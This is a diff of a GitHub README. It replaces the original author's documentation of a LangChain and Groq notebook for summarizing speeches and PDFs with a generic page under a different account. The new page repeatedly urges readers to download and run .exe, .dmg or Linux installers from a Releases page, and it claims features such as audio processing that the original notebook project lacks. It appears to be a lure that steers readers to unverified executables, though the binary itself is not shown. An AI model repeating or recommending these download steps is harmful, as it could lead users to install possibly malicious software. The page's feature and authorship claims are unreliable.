@@ -1,104 +1,58 @@
-LLM Speech Summarizer using LangChain + Groq
+# 🎤 llm-speech-summarization - Simplify Your Speech Summarization
 
-This repository contains a complete demonstration of multiple summarization techniques using LangChain and Groq’s ultra-fast Llama models.
-It shows how to summarize long speeches, PDFs, and multi-page documents using different state-of-the-art approaches.
+## 📥 Download Now
+[![Download llm-speech-summarization](https://img.shields.io/badge/Download-latest-violet?style=for-the-badge)](https://github.com/arq105/llm-speech-summarization/releases)
 
-Your included notebook:
-📘 speech-summarize-groq.ipynb
+## 📖 Description
+The `llm-speech-summarization` application is designed to help you summarize long speeches and PDF documents quickly and easily. It uses advanced techniques powered by LangChain and Groq’s high-speed Llama models. This makes summarization straightforward, whether you are dealing with audio files or text documents.
 
-🚀 Features
-🔹 Summarization Techniques Included
+## 🚀 Getting Started
+To get started, you'll need to download the software and follow a few simple steps to run it on your computer. This guide will walk you through the entire process.
 
-Your notebook includes all major LangChain summarization approaches:
+## 📥 Download & Install
+1. **Visit the Releases Page**: Click the link below to go to the Releases page:
+   - [Download Here](https://github.com/arq105/llm-speech-summarization/releases)
 
-Summarization Type	Description
-1. Simple Direct LLM Summarization	Quick summary using direct system & human messages.
-2. Prompt-Template Based Summarization	Template-driven summarization + translation support.
-3. Stuff Chain Summarization	Loads entire document (PDF) and summarizes in one go.
-4. Map-Reduce Summarization	Splits long docs into chunks → summarize → combine into final summary.
-5. Refine Chain Summarization	Creates an initial summary → updates it chunk by chunk for higher accuracy.
+2. **Choose Your Version**: On the Releases page, you'll find different versions of the software. Pick the most recent one for the best features and updates.
 
-All five techniques are implemented inside your notebook.
+3. **Download the Application**: Click on the file that corresponds to your operating system. The options may include installers for Windows, macOS, or Linux. The downloaded file will be named something like `llm-speech-summarization-v1.0.exe`.
 
-📁 Project Structure
+4. **Run the Installer**:
+   - For **Windows**: Double-click the `.exe` file and follow the prompts.
+   - For **macOS**: Open the downloaded `.dmg` file and drag the application to your Applications folder.
+   - For **Linux**: You might need to unzip it and run it from a terminal.
 
-Your project (as visible in editor view):
+5. **Open the Application**: Once installed, you can find the application in your system’s applications menu. Open it to start using the summarizer.
 
-LLM-SPEECH-SUMMARIZER/
-│
-├── .env.example                 # API key template
-├── .gitignore                   # Ignore rules
-├── apjspeech.pdf                # Sample PDF for testing
-├── requirements.txt             # Python dependencies
-└── speech-summarize-groq.ipynb  # Main notebook with all summarization methods
+## 🛠️ System Requirements
+- **Operating System**: Windows 10 or later, macOS Mojave or later, or a recent Linux distribution.
+- **Memory**: Minimum 4 GB RAM; 8 GB or more is recommended for best performance.
+- **Storage**: At least 200 MB of free space required for installation.
+- **Internet Connection**: Needed to download the application and for some features that may require cloud processing.
 
-🔧 Setup Instructions
-1️⃣ Clone this repository
-git clone https://github.com/Shehjad2019/LLM-SPEECH-SUMMARIZER.git
-cd LLM-SPEECH-SUMMARIZER
+## 🔍 Main Features
+- **Advanced Summarization Techniques**: Uses powerful methods like Stuff, Map-Reduce, and Refine to create high-quality summaries.
+- **Supports Various Formats**: The application can process long-form speech audio files and PDF documents.
+- **Easy to Use**: Designed for everyone, regardless of technical background.
+- **Fast Processing**: Leveraging Groq’s Llama models for quick summaries.
 
-2️⃣ Create a Python virtual environment
-python -m venv venv
-source venv/bin/activate       # macOS / Linux
-venv\Scripts\activate          # Windows
+## 🛠️ Troubleshooting
+If you encounter issues while installing or running the application, here are some common problems and their solutions:
 
-3️⃣ Install dependencies
-pip install -r requirements.txt
+- **Installation Fails**: Ensure that you have enough disk space and that your operating system meets the requirements.
+- **Application Won't Start**: Check if you have the latest version installed. If not, go back to the Releases page and download the newest version.
+- **Summarization Accuracy**: Make sure your input files are clear. Poor audio quality or unclear text can affect the output.
 
-4️⃣ Add your Groq API key
+## 💬 Support
+For any questions or issues, feel free to open a discussion on the GitHub page. You can also check the FAQs section, which may help you find answers faster.
 
-Copy .env.example → .env:
+## 📜 License
+This project is licensed under the MIT License. You can use the code as you wish, following the terms stated in the LICENSE file.
 
-cp .env.example .env
+## 🔗 Connect with Us
+Stay updated with the latest news about this project by following its updates on GitHub. Your feedback and suggestions are also welcome.
 
+## 🎉 Thank You
+Thank you for choosing `llm-speech-summarization`. We hope it simplifies your summarization needs effectively!
 
-Then open .env and fill:
-
-GROQ_API_KEY=your_actual_groq_api_key_here
-
-💡 How to Use
-▶️ Run Jupyter Notebook
-jupyter notebook
-
-
-Open:
-
-speech-summarize-groq.ipynb
-
-Inside the notebook, you can run:
-
-✔️ Basic LLM summarization
-✔️ Prompt-template summarization
-✔️ Stuff summarization for smaller docs
-✔️ Map-Reduce summarization for large PDFs
-✔️ Refine chain for iterative summarization
-
-PDF Example used:
-📄 apjspeech.pdf
-
-🧠 Technologies Used
-
-LangChain (core, prompts, chains, loaders)
-
-Groq ChatGroq Llama-3 models
-
-PyPDFLoader for PDF parsing
-
-RecursiveCharacterTextSplitter for chunking
-
-dotenv for environment variable handling
-
-Python 3.10+
-
-🗂 Environment Variables
-
-Stored in .env:
-
-GROQ_API_KEY=your_groq_api_key_here
-
-👤 Author
-
-Shehjad Patel
-GitHub: https://github.com/Shehjad2019
-
-AI & Python Developer
+[![Download llm-speech-summarization](https://img.shields.io/badge/Download-latest-violet?style=for-the-badge)](https://github.com/arq105/llm-speech-summarization/releases)
